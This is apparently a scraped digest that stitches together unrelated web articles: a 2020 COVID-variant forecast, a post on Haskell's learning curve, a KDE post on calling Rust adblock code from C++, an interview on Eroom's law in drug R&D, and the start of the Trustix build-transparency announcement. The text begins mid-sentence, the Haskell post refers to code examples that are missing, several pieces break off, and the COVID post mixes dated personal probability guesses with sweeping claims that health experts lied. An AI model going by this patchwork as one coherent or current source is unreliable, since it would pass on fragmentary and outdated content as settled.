configured well enough in the beginning that nothing bad happened to my site.</p>

<p>There is evidence of a new highly-infectious strain of COVID-19 emerging in the UK and other countries. This post is an elaboration of my current model of it, as promised in my <a rel="noreferrer noopener" href="https://putanumonit.com/2020/12/26/lesswrong-2018-epistemology/" target="_blank">review of LessWrong’s collection on <em>Epistemology</em></a>. Most of the information I have on this new COVID variant comes from <a rel="noreferrer noopener" href="https://www.lesswrong.com/posts/CHtwDXy63BsLkQx4n/covid-12-24-we-re-f-ed-it-s-over" target="_blank">this post by Zvi</a>, the links from it, and comments. Read those if you haven’t yet.</p>



<p>Though I usually strive to have timeless content on my blog, I’m making another COVID exception. Ten months ago I write <em><a rel="noreferrer noopener" href="https://putanumonit.com/2020/02/27/seeing-the-smoke/" target="_blank">Seeing The Smoke</a></em> and dozens of people told me it flipped the switch for them and let them prepare for COVID in time; this post may end up even timelier. I anticipate both my model and the evidence that feeds into it to change rapidly, everything below is a snapshot of what I believe as of Christmas Day 2020. Reminder: I am not an expert on any of this, just the Putanumonit guy putting a num on it.</p>



<hr>



<p>The median prediction on <a rel="noreferrer noopener" href="https://www.lesswrong.com/posts/CHtwDXy63BsLkQx4n/covid-12-24-we-re-f-ed-it-s-over" target="_blank">Zvi’s LW post</a> is around 60% that the new variant is at least 50% more transmissible and same for there being a third COVID wave in the US:</p>

<p>I would add a few things without straying too far from the crowd’s wisdom. </p>



<p>First, I would revise the crowd’s estimate for the first question down for no other reason than that the poll came at the end of a post titled <em>We’re Fucked, It’s Over</em>. If ever there was going to be a framing effect pushing estimates upwards, this would be it. There are also <a rel="noreferrer noopener" href="https://twitter.com/CupOfjoe1986/status/1342386338717458432" target="_blank">more alternative explanations</a> for the information coming out of the UK than Zvi accounted for.</p>



<p>Instead of just saying that that there’s a 60% chance it has a 50% higher transmissibility, I would break it down something like this:</p>



<ul><li>35% that the new strain is a nothingburger.</li><li>30% that it’s <em>slightly </em>more transmissible, say with an effective reproduction rate (r<sub>t</sub>) 20% higher.</li><li>30% that it’s <em>significantly </em>more transmissible, e.g. 70% higher.</li><li>5% in the Captain Malcolm Reynolds probability bucket.</li></ul>



<p>I also believe it very likely that new variant is already present in the US, given that a dozen flights from London have landed in NYC just in the last week. Travel from the UK has been restricted on Christmas eve but the dust from the bolting horse has already settled by the barn door.</p>



<p>A variant that’s just 20% more infectious will still take over exponentially from the old variant resulting in a chart like the one we see.</p>

<p>Several people have tried to explain away the growth of the new variant as being due to things like catching a superspreader, but it doesn’t have to be one or the other. It could have r<sub>t</sub>=1.2 <em>and</em> catch a superspreader event to make it look like r<sub>t</sub>=1.5-1.7. This is why I am giving extra weight to the hypothesis of slightly higher transmissibility.</p>



<p>I also think there’s a <strong>huge </strong>difference between r<sub>tnew</sub>=1.2 and r<sub>tnew</sub>=1.7 (here I mean r<sub>t</sub> relative to the old strain given the same measures of containment) in terms of outcomes. </p>



<p>In the first case, to keep the virus suppressed (i.e. r&lt;1) we need to take measures that would have yielded r<sub>t</sub>=0.8 for the old strain. <a rel="noreferrer noopener" href="https://rt.live/us/NY" target="_blank">New York sustained that number</a> (albeit never dipping below 0.7) for two months running in the spring. Given that ~30% of the state has already been infected, that makes this all the more doable. Gyms and restaurants will close and people will grumble, but we’ll probably survive till the vaccine.</p>



<p>r<sub>tnew</sub>=1.7 is an entirely different case. Suppressing it would require the sort of lockdown that would yield r<sub>t</sub>=0.6 for the old strain, a number that <a rel="noreferrer noopener" href="https://rt.live/" target="_blank"><strong>has never been reached by any US state for any amount of time</strong></a>. I see no way in hell that Americans would agree to a lockdown <em>much stricter than any we’ve had so far,</em> especially after they’ve been promised that the worst is behind them.</p>



<p>Rural red tribers will not agree because Biden is in the White House. Urban blue tribers because containment in cities is much harder anyway. Young people will not agree because the virus harms them less than the lockdown. Dumb people will not agree because they will not understand the science and math and smart people, seeing that, will try to get infected early before the hospitals are overwhelmed.</p>



<p>No one will believe any of the “experts” at the CDC or WHO or Dr. Fauci because they have all repeatedly lied and tried to manipulate people and reversed their positions without admitting that they have. They all have <em>negative </em>credibility at this point with many Americans.</p>



<p>If the new virus is 1.7 times as infectious I believe that Americans will most likely simply give up on containment, the populace if not the government. We’ll have time to vaccinate the most vulnerable 10-20% of the population by April-May, at which point the majority of everyone else will get the new strain. </p>



<p>There is a small chance that the US will get its shit together vaccine-wise and beat the new strain in a race. <a rel="noreferrer noopener" href="https://twitter.com/yashkaf/status/1342569735884517379" target="_blank">Israel, for example</a>, has a simple system in place to vaccinate the vast majority of its 9-million strong population by the end of March. On this timetable, even a virus with r<sub>t</sub>=1.7 will not have time to explode before herd immunity kills it.</p>



<p>The same is not true of the US, which is currently projected to reach majority immunization no earlier than the late summer by refusing to do <a rel="noreferrer noopener" href="https://twitter.com/yashkaf/status/1342546177288527872" target="_blank">basic things to rush the process</a>.</p>



<p>And what’s the Captain Mal bucket?</p>



<figure><div>
<p><span><iframe width="900" height="507" src="https://www.youtube.com/embed/MnQaYGJ5oYs?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div></figure>



<p>The new variant being more virulent in addition to being more infectious. Another newer strain that’s even worse. Or, in a nightmare scenario, a highly-transmissible mutation that also renders the Pfizer and Moderna vaccines ineffective. </p>



<p>If COVID has taught us one thing, it’s that it’s all usually worse than we thought.</p>



<p>So the bottom line is that I currently estimate a 30-35% chance of us being truly fucked, in the sense of dozens of millions more Americans getting COVID in 2021 and hundreds of thousands more dead, along with local attempts at extreme lockdowns. I’m not going to speculate on the further implications of this for things like financial markets or the fabric of our civilization. I also anticipate that I’ll be revising these numbers in the next few days. </p>



<p>But rationalists are seeing the smoke again.</p>

    <p>Haskell is notoriously famous for having a steep learning curve. A situation that frustrates newcomers to the language, especially newcomers who are experienced developers using other programming languages.</p>

<p>It is not uncommon to see seasoned developers express their frustration by making the point that all of the other languages they have picked up, they have been able to get productive within a reasonable amount of time, but Haskell only manages to remain an impenetrable wall of Egyptian glyphs after the same period of time.</p>

<p>A reason often cited for Haskell’s steep learning curve is the fact that <em>“Haskell is different”</em>. The argument goes: Haskell is not all that difficult, it is just different, and because of this, it is unfamilair. But most of the time, when this argument is made, it is not mentioned how exactly Haskell is different.</p>

<p>Sure, there could be other reasons why learning Haskell may be considered difficult, but we think the <em>difference</em> argument is an interesting one worth exploring. This is exactly what this post is about. The idea is to do more than just mention that Haskell is different but to show how. The hope is that doing this, will prepare newcomers to the language, hence preventing Haskell’s difference from being a stumbling block to learning the language.</p>

<p>So in what ways is Haskell different?</p>

<!--end_excerpt-->

<h2 id="two-axes-of-difference-syntax-and-computation-model">Two Axes of Difference: Syntax and Computation Model</h2>

<p>There are two axes where Haskell is fundamentally different: <em>The syntax and the computation model</em>.</p>

<p>Haskell has a syntax that is different from languages most experienced developers are familiar with. Also, Haskell’s computation model is based on a different paradigm when compared with most mainstream languages. Understanding this will help in developing a better learning strategy.</p>

<p>Most mainstream programming languages inherit the C-like syntax and have imperative semantics. Haskell syntax is not derived from C, and it is not an imperative language, instead, it is a functional language.</p>

<p>This means a programmer who is experienced with an imperative language with a C-like syntax will find it easy to pick up another imperative language with C-like syntax. Attempting to pick up Haskell in such a similar fashion will be harder and if not aware of these differences, Haskell will feel needlessly hard.</p>

<h3 id="syntax-difference-haskell-is-not-a-c-like-language">Syntax Difference: Haskell is not a C-like language</h3>

<p>Most, if not all current mainstream programming languages have a syntax inspired or derived from C. To illustrate this, let’s take a coding problem from <a href="https://www.codewars.com/">Codewars</a> and see the solutions in the first top <a href="https://www.tiobe.com/tiobe-index/">5 programming languages</a> as rated by the Tiobe programming index, which at the moment of writing this post are: C, Java, Python, C++ and C#. <br></p>

<em>Problem Statement: Multiples of 3 or 5</em> <a href="https://www.codewars.com/kata/514b92a657cdc65150000006/">source</a></p>

<p>If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6, and 9. The sum of these multiples is 23.</p>

<p>Finish the solution so that it returns the sum of all the multiples of 3 or 5 below the number passed in.</p>

<p>Note: If the number is a multiple of both 3 and 5, only count it once. Also, if a number is negative, return 0(for languages that do have them)

<p>You see the pattern here? Even in Python, a language that uses whitespace instead of curly braces, the structure of the solutions are all similar. It is not then difficult to see how someone who is proficient in one of the languages can easily make sense of any of the other languages because the structure of their syntax are the same.</p>

<p>Note that some of these imperative languages above now have constructs that makes it possible to emulate functional syntax. For example iterations and operations usually performed via <code>for loops</code> can now be done using construncts like streams and lambdas. This only shows the influence of functional programming on mainstream imperative languages. Infact these functional style is often seen as unnatural to the original languages. The creator of Python, Guido van Rossum, shared a similar sentiment about functional programming style in Python:</p>

<blockquote>
  <p>Python probably has the reputation of supporting functional programming based on the inclusion of lambda, map, filter, and reduce in the language, but in my eyes these are just syntactic sugar, and not the fundamental building blocks that they are in functional languages.</p>

<p>Now let us see the solution in Haskell:</p>

<p>This looks very different from the previous solutions. The syntax is different and that is because Haskell’s syntax is not inspired by C. <strong>More importantly, this syntax is native to Haskell, and not just a style</strong>. This highlights how Haskell is different when it comes to the axis of syntax.</p>

<blockquote>
  <div><p>An analogy:
Imagine you understand British English, and you want to learn how to write American English. Such a task would be pretty straight forward since you can more or less apply the bulk of the knowledge you already have. What you will then need to learn consists of knowing where to tweak things like the grammar and spelling and idioms that are peculiar to American English. Now contrast that to learning how to write Russian. To do that successfully you will need to be able to set aside what you already know in English and be ready to pick up new grammar rules, new alphabets, new spellings, new idioms, etc.</p><p>
Learning yet another of the mainstream C-family like languages once you know one, is like learning how to speak American English if you already know any variant of English Languages. Learning Haskell on the other hand is similar to already knowing English but wanting to learn Russian. You have to appreciate and understand the fact that the process cannot be approached with a strategy that involves applying what you already know and tweaking one or two things here and there, it has to be approached with the intention to pick up a totally different set of rules about computation and programming. If you are not aware of this fact, then it would become easy to get frustrated and make statements like: I am a senior programmer and in my 10 years of programming I have been able to pick up a new language in 2 weeks tops! I can’t do that with Haskell, hence Haskell is impenetrable. Nope Haskell is not impenetrable, you have just been applying the wrong learning technique. Being aware of this is part of the first steps in learning Haskell successfully.</p></div>

<h2 id="computation-model-difference-haskell-is-not-an-imperative-language">Computation Model Difference: Haskell is not an imperative language</h2>

<p>The other axis where Haskell is different is its computation model it is based on. This difference is not as obvious as the syntax difference but is a more important difference to appreciate.</p>

<p>Programming languages are based on <a href="https://en.wikipedia.org/wiki/Model_of_computation">Models of computation</a>. This is not difficult to appreciate, as programming languages can be seen as a mechanism to express computations.</p>

<p>The theory of computation and the different possible models have a rich mathematical and academic background, with sequential models, functional models, and concurrent models being the three broad categories.</p>

<p>Most mainstream programming languages are imperative in nature. This means their semantic is derived from the sequential model of computation. To be specific, most imperative languages are implementations of <a href="https://en.wikipedia.org/wiki/Random-access_machine">Random access machines</a>/<a href="https://en.wikipedia.org/wiki/Turing_machine">Turing machines</a>, which are just two examples of the sequential model of computation.</p>

<p>The essence of this model involves expressing computation as a sequential step that involves data mutation together with control structures that control how data is accessed and updated as part of the computation.</p>

<p>This model is the basis of the imperative programming paradigm.</p>

<p>Haskell on the other hand is not based on a sequential model of computation hence it is not an imperative programming language. Haskell is based on the functional model of computation. To be specific, Haskell is an implementation of the <a href="https://en.wikipedia.org/wiki/Lambda_calculus">Lambda calculus</a>, which is one example of a functional model of computation.</p>

<p>The essence of Lambda Calculus involves expressing computation based on function abstraction and application using variable binding and substitution. Haskell, at its core is nothing but an implementation of Lambda Calculus.</p>

<p>These computation models then dictate the mental model that would be required when working with a programming language based on them. A sequential model that involves data mutation requires a different model than a functional model that is an implementation of lambda calculus which requires function abstraction and application.</p>

<p>Hence this is why it is beneficial, especially for seasoned developers picking up Haskell to understand a bit of Lambda Calculus, not to the level required of a mathematician or a computer scientist, but enough to understand why Haskell is the way it is. If not for any other reason but the fact that it will help to appreciate what we mean by function in a mathematical sense and how that is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>While trying to implement a long planned feature, an ad block in Angelfish, the Plasma Mobile webbrowser,
I was looking for a mostly complete and performant library that provides this functionality.</p>

<p>First I found libadblockplus, which is a C++ library providing the AdblockPlus core functionality.
Sounds great, right? Well, not quite. It includes it’s own v8 java script engine,
and since we are talking about a webbrowser with a QML interface here,
including a third java script engine and a second copy of v8 was absolutely not an option.
Even if this wasn’t a webbrowser,
running a java script engine as implementation detail of a library is at least … problematic.</p>

<p>The other option I found is <a href="https://github.com/brave/adblock-rust">adblock-rust</a>,
which is the built-in ad block of the Brave browser. As the name tells, it is written in Rust,
and I was originally looking for a C++ library. But it turned out this was not much of a problem,
since Rust features excellent C interoperability, just like C++.
Based on this common ground, bindings can be created to use Rust code from C++ (and the other way around if needed).</p>

<h2 id="approach-1">Approach 1</h2>
<p>My first approach was to use raw ffi. That means essentially building a C API featuring the typical C primitive types in rust,
and telling the rust compiler to represent structs in memory the same way that C would do.
Thanks to cbindgen, which automatically generates a header file with the information for the C compiler to know which fields a struct has and were they are,
we directly get something we can include in our C++ project.</p>

<p>The rust build system cargo is capable of running custom code at build time, and we can use that to run cbindgen on our rust code, by adding a file named <code>build.rs</code>:</p>
<pre><code>extern crate cbindgen;

use std::env;

fn main() {
    let crate_dir = env::var("CARGO_MANIFEST_DIR").unwrap();

    cbindgen::generate(&amp;crate_dir)
        .unwrap()
        .write_to_file("bindings.h");
}
</code></pre>

<p>Our core data structure for the ad block looks like this:</p>
<pre><code>#[repr(C)]
pub struct Adblock {
    blocker: *mut Engine,
}
</code></pre>
<p>It stores a pointer to the rust Engine type in a C compatible struct.
The struct can not be created directly from C / C++, since we don’t know anything about the Engine type there.</p>

<p>So we need a function on the rust side that creates and initializes the Engine for us and packs it into an <code>Adblock</code> struct.
Since the code in angelfish is doing a bit more than only that, the function takes two C string arguments, and returns a pointer to a mutable (non-const) Adblock object.</p>
<pre><code>#[no_mangle]
pub extern "C" fn new_adblock(
    list_dir: *const c_char,
    public_domain_suffix_file: *const c_char,
) -&gt; *mut Adblock
</code></pre>
<p>A few more thigs in this function signature are unusual, but they are all related to the FFI / C compatibility we need here:</p>
<ul>
  <li><code>#[no_mangle]</code> tells the rust compiler not to apply its rust specific function name mangling</li>
  <li><code>extern "C"</code> tells that this function should use the C calling conventions.</li>
</ul>

<p>Every time we interact with data from C, the rust compiler is unable to run its usual safety checks.
For that reason we need unsafe blocks around those lines of code.
If anything unexpectedly segfaults, it’s likely to be in our unsafe blocks.
To get a string that we can feed into a usual rust API, we can use <code>unsafe { CStr::from_ptr(public_domain_suffix_file).to_str() }</code>.</p>

<p>For more examples of how to interact with the C / C++ side, feel free to have a look at <a href="https://invent.kde.org/plasma-mobile/plasma-angelfish/-/blob/20e166c0fe2e38be63824b957c02fa58865ac67c/src/rs/adblock/src/adblock.rs">some real code in Angelfish</a>.
I’m by no means an expert on this, but it should help you get started.</p>

<p>Using this approach, the ad block could successfully be implemented in about 140 lines of rust code, of which only half is FFI code, and the rest actual logic.</p>

<h2 id="approach-2">Approach 2</h2>
<p>The second approach is to use the cxx crate (library), which can generate most of the boilerplate FFI code automatically, and provides a modern API on the C++ side.
To do that, it implements its own wrapper types, each wrapping the functionality of one type of one of the languages. Those wrapper types are implemented in both languages, and allow easily passing more advanced types than pointers and number types through the FFI boundary.
On the rust side, the wrapper types are not really visible, because a macro generates everything for us.</p>

<p>The only unusual thing on the rust side will be a small ffi module, declaring which types and functions we want to expose to C++:</p>
<pre><code>#[cxx::bridge]
mod ffi {
    extern "Rust" {
        type Adblock;
        type AdblockResult;

        fn new_adblock(list_dir: &amp;str, suffix_file: &amp;str) -&gt; Box&lt;Adblock&gt;;
        fn should_block(
            self: &amp;Adblock,
            url: &amp;str,
            source_url: &amp;str,
            request_type: &amp;str,
        ) -&gt; Box&lt;AdblockResult&gt;;
    }
}
</code></pre>

<p>All objects are returned as smart pointers, like <code>Box</code>.
On the C++ side, this will result in a <code>rust::Box&lt;Adblock&gt;</code>, which is a type generated by the cxx_build crate, which is doing something slightly similar to cbindgen.</p>

<p>With the cxx crate, our build.rs will look like this:</p>
<pre><code>extern crate cxx_build;

fn main() {
    cxx_build::bridge("src/adblock.rs").compile("angelfish-adblock")
}
</code></pre>

<p>You may wonder, if the cxx crate makes everything so easy, why did I start with approach 1 at all?
I had had a look at the cxx crate a few month ago, when it was still too minimal to do what I needed. Luckily I had another look, since it has become really useful in the meantime.
However learning the raw ffi way was important to understand what actually happens in the background, and I’d almost recommend everyone to have a look at that first before using the cxx crate. Using <code>cargo expand</code> you can then understand what cxx generated for you.</p>

<p>Given the cxx crate makes this so much easier, I initially feared it might add tons of new dependencies and increase the build time, but to my surprise it actually has a lot less dependencies than cbindgen. Even though cbindgen only uses those at build time (they don’t end up in the binary), they take some time to build.</p>

<p>Angelfish has recently switched to using the cxx crate, so you find usage examples in the <a href="https://invent.kde.org/plasma-mobile/plasma-angelfish/-/blob/d92e48e392303deda6cf3c1552f9f7b5189e2953/src/rs/adblock/src/adblock.rs">current version of the ad block code</a>.</p>

<h2 id="build-system">Build system</h2>
<p>After we have written the FFI, we need to build the Rust code as part of our project, most likely using CMake. This could be very annoying and complicated, but luckily <a href="https://github.com/AndrewGaspar/corrosion">Corrosion</a> exists to make this very easy for us.
It can build our rust code using the cargo build system, and create CMake targets for the library we built, so its easy to link against it.</p>

<h2 id="usage-in-kde">Usage in KDE</h2>
<p>Now that the implementation part is explained,
it makes sense to look into where this can be useful and where not.
Unfortunately the truth is that some distros are still not fully happy with having to package rust code,
because the rust community has a different approach to sharing code than known from the C / C++ world.
While Qt re-implements some functionality also found in other C++ libraries, to only make it necessary to package Qt and not one library for json, one for xml, for http and so on, the rust community likes to split everything into small packages, so no unnecessary code is included.</p>

<p>In Angelfish, all the rust code is optional, and Angelfish can of course still be built without Rust.</p>

<p>Possible areas in KDE that could profit from using Rust are icon and SVG theme rendering code, which could profit from using rsvg or resvg.
I can imagine it could also be useful for document thumbnailers, when a rust implementation of the file type already exists. A similar case could be KIO workers, and pretty much any other project that can profit from optional plugins.</p>

<h2 id="conclusion">Conclusion</h2>
<p>This approach to using Rust in KDE allows to make use of the many libraries and language features the ecosystem provides, without running into the infamous “rewrite it in Rust” reflex. It avoids having to create rust bindings for all KDE Frameworks and Qt only to make use of Rust, and still produces readable code.</p>

While computers got faster and cheaper year after year for the last five decades, healthcare costs shot three to four times higher than inflation in the last two decades <span>alone.<sup><a href="#fn2" id="r2">2</a></sup></span></p> <p>And if the recent coronavirus pandemic that swept the globe in a few short weeks has shown us anything, it’s how close our healthcare systems truly are to their breaking point.</p> <p>Yet, unlike other stagnant technology areas, like defense or nuclear energy, most people will agree that healthcare is both badly broken and vital to fix, so by starting there at least, fewer people will try to stop an ambitious founder.</p> <p>Of all the healthcare fields that one could start with, many fashionable and less fashionable areas receive a fair bit of attention already from venture capitalists and philanthropists—it’s hard to tell them apart sometimes. Yet there’s one big area that has stagnated despite the close scrutiny it receives, and that’s pharmaceuticals.</p> <p>The great promise was that by unlocking the secrets of biology, we would create all kinds of life-saving, even life-enhancing medicine, from a full-course-meal in a pill to a general cancer cure.</p> <p>Moreover, breakthroughs in pharma would open up new avenues of research in many ancillary fields, from nutrition and anti-aging to preventative medicine writ large. The more progress we’d make, the less effort we’d have to put in to uncover new secrets.</p> <p>However, today’s pharma industry looks nothing of the sort. Looking from the outside, it seems that despite a growing mountain of scientific and technical know-how, the cures only seem to get harder and harder to find. So, one might reasonably ask: What went wrong?</p> <p>To cut the Gordian knot of pharma’s long stasis, we must turn to the one robust measure of progress the industry has, known simply as Eroom’s law. The name is already very suggestive, as it’s quite literally an ironic backward spelling of Moore’s law—the computer industry’s relentless benchmark of progress—which makes it a fitting place to&nbsp;start.</p> <p>Race to the bottom</p> <p>Eroom’s law is the observation that the cost of developing a new drug roughly doubled every nine years from 1950 through 2010. All in all, it shows a roughly 80-fold decline in the productivity of drug R&amp;D.</p> <p>It’s hard to say what’s worse, the staggering decline, or the fact that it went on unchecked for six decades. Either way, as the total sum of our efforts to look for life-saving secrets, Eroom’s law leaves no doubt that our ability to explore the frontier has atrophied catastrophically.</p> <figure> <img alt="A graph of Eroom’s law shows that the cost of developing a new drug roughly doubled every nine years from 1950 through the 2010." id="img-eroom-1" src="https://refoundable.com/assets/img/buf.png" data-echo="/assets/img/eroom-1.png"> <figcaption id="cap-eroom-1">By 2010, the total R&amp;D spend per drug approved was about a&nbsp;hundred times higher, in real dollars, than it was in 1950.<span>Graph by Jack Scannell</span></figcaption> </figure> <p>Although some aspects of this disturbing trend line were known since the 1980s, Eroom’s law was formally articulated in 2012, at the tail end of the long decline, in a seminal paper published in <em>Nature Reviews Drug Discovery</em> by four co-authors led by Jack Scannell.<sup><a href="#fn3" id="r3">3</a></sup></p> <p>In a field plagued by narrow specialization, Jack Scannell is something of a renaissance man, having seen the industry from a distance and up close while working in drug research, private consulting, pharma and biotech investing, and policy advising.</p> <p>When Scannell worked as an investment analyst, he used to ask the top executives at major pharma firms to explain why the productivity of drug R&amp;D kept falling for so long, when the science and technology inputs were getting cheaper and more efficient all the time. Generally, he’d get the same kind of answer: the industry had run out of “low-hanging fruit.”</p> <p>In the course of his own later investigations, Scannell began to focus on a serious technical problem called “model validity,” which he found was holding back progress in the science of drug discovery. And while everyone can acknowledge that there’s a host of issues to fix with the drug industry, we agree with Scannell that starting with the science could prove decisive in the heroic effort needed to restart general progress in the field.</p> <p>So, we sit down with Jack Scannell to discuss the beginning and end of Eroom’s law, the technical frontier of drug discovery, and whether drug R&amp;D can help win the fight against COVID-19 and prevent future pandemics.</p>  <hr>  <p id="q1">Your 2012 paper diagnosed the decline in drug R&amp;D productivity over the preceding six decades.

That struck me as an ugly contrast.</p> <p>Many people bemoaned the R&amp;D productivity problem before, but not enough people had drawn attention to the contrast between input and output efficiency. I thought it was an important public policy problem, and it seemed to attract less attention than it deserved.</p> <p>I remember talking about the contrast with a friend of mine, William Bains. We chatted that drug industry productivity looked like Moore’s law backwards, and that’s how the term “Eroom’s law” was born.</p> <p id="q2">The drug industry already knew it had an R&amp;D productivity problem, so what was missing in previous attempts to diagnose the issue?<a href="#q2"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>As long ago as 1980, there was a great paper on the R&amp;D slowdown by Fred Steward and George Wibberley, which we cited along with some other good work in our <span>paper.<sup><a href="#fn4" id="r4">4</a></sup></span></p> <p>However, in general, I thought there were two problems:</p> <p>First, a lot of the diagnostic efforts were private. They were happening in some of the drug and biotech companies, but they weren’t making it into the public domain, so they couldn’t affect science policy or investor behavior.</p> <p>Second, what did often make it into the public domain were not really diagnoses per se, but attempts to sell “solutions” that, in many cases, were largely unrelated to the core problems of drug R&amp;D.</p> <p>If, for example, you were an academic geneticist, low R&amp;D productivity was an occasion to promote more investment in genomics. If you were an investment bank, you saw an opportunity to promote M&amp;A to Big Pharma. If you were a consulting firm, you might say that the reporting lines or the business processes were wrong; things you could fix with a re-engineering project.</p> <p>At the time, I was working as an investment analyst. A bad prognosis can be very interesting to an analyst, because if you think an industry is in real trouble, you don’t have to own it. That meant I had a different set of biases to most people. And I didn’t have any particular solution to sell.</p> <p>On the whole, I think lots of people would’ve been better qualified to write the paper, but their day jobs meant they couldn’t write it.</p> <p id="q3">Eroom’s law was widely adopted after your paper came out. What was the general reaction you saw after you published?<a href="#q3"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>People were certainly glad that someone had put names to things that they knew, or suspected, were happening already. Apart from Eroom’s law itself, people liked something else we talked about in the paper, which I called the “Better than the Beatles” problem.</p> <p>Imagine how hard it would be to sell new pop songs if every new song had to be better than the Beatles, if you could download all the old Beatles records for free, and if no one ever got bored of listening to the same Beatles songs over and over again.</p> <p>That’s analogous to the problem the drug industry faces, in that some old drugs are very good, they cost next to nothing when their patents expire, and doctors don’t get bored of prescribing them.</p> <p>So in many therapy areas, you end up with this ever-expanding back catalog of virtually free and very good medicine, against which any new medicine would have to compete. That reduces the value of as-yet-undiscovered drugs. It also pushes drug R&amp;D towards the areas where we don’t have a catalog of good cheap stuff, or precisely the areas where R&amp;D is likely to be harder.</p> <p>Inevitably, people also appropriated Eroom’s law to justify what they wanted to do anyway. That reminds me of a line from a famous British TV comedy, <em>Yes, Prime Minister</em>, which is about a hapless politician who is ruthlessly managed by his civil servants: “Something must be done. This is something. Therefore, we must do it.” I do occasionally see papers that make the same kind of <span>argument.<sup><a href="#fn5" id="r5">5</a></sup></span></p> <p>However, to be honest, apart from a few people in the drug industry telling me that the paper became required reading, and aside from seeing the Eroom graph in a lot of presentations, it’s not clear to me that anything different was done after the paper was read.</p>  <hr>  <p id="q4">The standard fixes to raise drug R&amp;D productivity tend to focus on process efficiency and cost-cutting. Why haven’t these solutions been enough to stop and reverse Eroom’s law?<a href="#q4"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>Simply put, they’re addressing the wrong class of problems.

December 27, 2020 | https://www.tweag.io/blog/2020-12-16-trustix-announcement/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-12-16-trustix-announcement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Downloading binaries from well-known providers is the easiest way to install new software.
After all, building software from source is a chore — it requires both time and technical expertise.
But how do we know that we aren’t installing something malicious from these providers?</p>
<p>Typically, we trust these binaries because we trust the provider.
We believe that they were built from trusted sources, in a trusted computational environment, and with trusted build instructions.
But even if the provider does everything transparently and in good faith, the binaries could still be <em>anything</em> if the provider’s system is compromised.
In other words, the build process requires <em>trust</em> even if all build inputs (sources, dependencies, build scripts, etc…) are known.</p>
<p>Overcoming this problem is hard — after all, how can we verify the output of arbitrary build inputs?
Excitingly, the last years have brought about ecosystems such as Nix, where all build inputs are known and where <em>significant amounts of builds are reproducible</em>.
This means that the correspondence between inputs and outputs can be verified by building the same binary multiple times!
The <a href="https://r13y.com/">r13y</a> project, for example, tracks non-reproducible builds by building them twice on the same machine, showing that this is indeed practical.</p>
<p>But we can go further, and that’s the subject of this blog post, which introduces <a href="https://github.com/tweag/trustix">Trustix</a>, a new tool we are working on.
Trustix compares build outputs for given build inputs across <em>independent</em> providers and machines, effectively decentralizing trust.
This establishes what I like to call <a href="https://build-transparency.org/">build transparency</a> because it verifies what black box build machines are doing.
Behind the scenes Trustix builds a <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a>-based <a href="https://en.wikipedia.org/wiki/Append-only">append-only</a> log that maps build inputs to build outputs, which I’ll come back to in a later post.
This log can be used to establish <a href="https://en.wikipedia.org/wiki/Consensus_(computer_science)">consensus</a> whether certain build inputs always produce the same output — and can therefore be trusted.
Conversely, it can also be used to uncover non-reproducible builds, corrupted or not, on a large scale.</p>
<p>The initial implementation of Trustix, and its description in this post are based on the Nix package manager.
Nix focuses on isolated builds, provides access to the hashes of all build inputs as well as a high quantity of bit-reproducible packages, making it the ideal initial testing ecosystem.
However, Trustix was designed to be system-independent, and is not strongly tied to Nix.</p>
<p>The developmentent of <a href="https://github.com/tweag/trustix">Trustix</a> is funded by <a href="https://nlnet.nl/project/Trustix">NLnet foundation</a> and the European Commission’s <a href="https://ngi.eu/">Next Generation Internet</a> programme through the <a href="https://nlnet.nl/PET">NGI Zero PET</a> (privacy and trust enhancing technologies) fund.
The tool is still in development, but I’m very excited to announce it already!</p>
<h2>How Nix verifies binary cache results</h2>
<p>Most Linux package managers use a very simple signature scheme to secure binary distribution to users.
Some use GPG keys, some use OpenSSL certificates, and others use some other kind of key, but the idea is essentially the same for all of them.
The general approach is that binaries are signed with a private key, and clients can use an associated public key to check that a binary was really signed by the trusted entity.</p>
<p>Nix for example uses an ed25519-based key signature scheme and comes with a default hard-coded public key that corresponds to the default cache.
This key can be overridden or complemented by others, allowing the use of additional caches.
